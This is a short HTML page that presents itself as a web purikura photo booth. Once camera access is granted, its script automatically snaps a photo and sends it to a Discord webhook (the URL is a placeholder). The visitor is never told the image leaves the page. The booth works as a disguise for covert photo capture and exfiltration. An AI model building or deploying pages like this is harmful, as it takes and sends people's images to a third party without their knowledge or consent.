<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>web版プリクラ</title>
</head>
<body>
    <h1>web版プリクラ</h1>
    <video id="video" autoplay playsinline style="border: 1px solid black; width: 300px; height: auto;"></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <h2>Captured Photo:</h2>
    <img id="capturedImage" alt="Captured photo will appear here" style="border: 1px solid black; width: 300px; height: auto; display: none;">

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const capturedImage = document.getElementById('capturedImage');
        const context = canvas.getContext('2d');

        // Discord Webhook URL (あなたのWebhook URLに置き換えてください)
        const discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';

        // カメラ映像を取得して表示
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;

                // カメラ準備後、写真を撮影して送信
                video.addEventListener('loadeddata', captureAndSendToDiscord, { once: true });
            })
            .catch(err => {
                console.error('Error accessing the camera', err);
            });

        // 写真を撮影してDiscordに送信
        function captureAndSendToDiscord() {
            // Canvasに映像を描画
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // キャプチャした画像を表示
            const imageDataUrl = canvas.toDataURL('image/jpeg');
            capturedImage.src = imageDataUrl;
            capturedImage.style.display = 'block';

            // カメラストリームを停止
            const stream = video.srcObject;
            stream.getTracks().forEach(track => track.stop());

            // Base64形式のデータをBlobに変換
            fetch(imageDataUrl)
                .then(res => res.blob())
                .then(blob => {
                    const formData = new FormData();
                    formData.append('file', blob, 'photo.jpg');
                    formData.append('payload_json', JSON.stringify({ content: 'Here is a photo!' }));

                    // Discord Webhookに画像を送信
                    fetch(discordWebhookUrl, {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => {
                        if (response.ok) {
                            console.log('Photo successfully sent to Discord.');
                        } else {
                            console.error('Failed to send photo to Discord:', response.statusText);
                        }
                    })
                    .catch(err => {
                        console.error('Error sending photo to Discord:', err);
                    });
                });
        }
    </script>
</body>
</html>
